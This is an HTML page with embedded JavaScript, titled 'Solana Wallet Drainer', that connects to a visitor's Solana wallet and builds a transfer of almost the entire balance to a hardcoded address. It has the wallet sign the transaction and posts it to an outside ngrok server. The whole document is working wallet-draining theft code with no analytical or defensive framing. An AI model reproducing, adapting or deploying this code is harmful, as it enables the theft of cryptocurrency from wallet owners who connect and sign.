<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Wallet Drainer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Solana Wallet Drainer</h1>
        <button id="connect-wallet">Connect Wallet</button>
        <button id="drain-wallet" disabled>Drain Wallet</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.30.2/lib/index.umd.min.js"></script>
    <script>
        const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
        let publicKey;
        const connection = new Connection('https://api.mainnet-beta.solana.com');

        document.getElementById('connect-wallet').addEventListener('click', async () => {
            if (window.solana) {
                try {
                    const response = await window.solana.connect();
                    publicKey = response.publicKey;
                    alert(`Connected to wallet: ${publicKey.toString()}`);
                    document.getElementById('drain-wallet').disabled = false;
                } catch (err) {
                    console.error(err);
                    alert('Failed to connect to wallet');
                }
            } else {
                alert('Solana wallet not found. Please install a wallet like Phantom.');
            }
        });

        document.getElementById('drain-wallet').addEventListener('click', async () => {
            if (!publicKey) {
                alert('Please connect your wallet first!');
                return;
            }

            try {
                const balance = await connection.getBalance(publicKey);
                const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию

                if (lamportsToSend <= 0) {
                    throw new Error('Insufficient funds to cover the transaction fee');
                }

                const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
                const transaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: drainerPubkey,
                        lamports: lamportsToSend,
                    })
                );

                const signedTransaction = await window.solana.signTransaction(transaction);
                const response = await fetch('https://702c-95-46-155-53.ngrok-free.app', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ signedTransaction: signedTransaction.serialize().toString('base64') })
                });

                const result = await response.json();
                if (response.ok) {
                    alert('Transaction sent: ' + result.signature);
                } else {
                    throw new Error(result.error);
                }
            } catch (error) {
                console.error('Transaction failed', error);
                alert('Transaction failed: ' + error.message);
            }
        });
    </script>
</body>
</html>
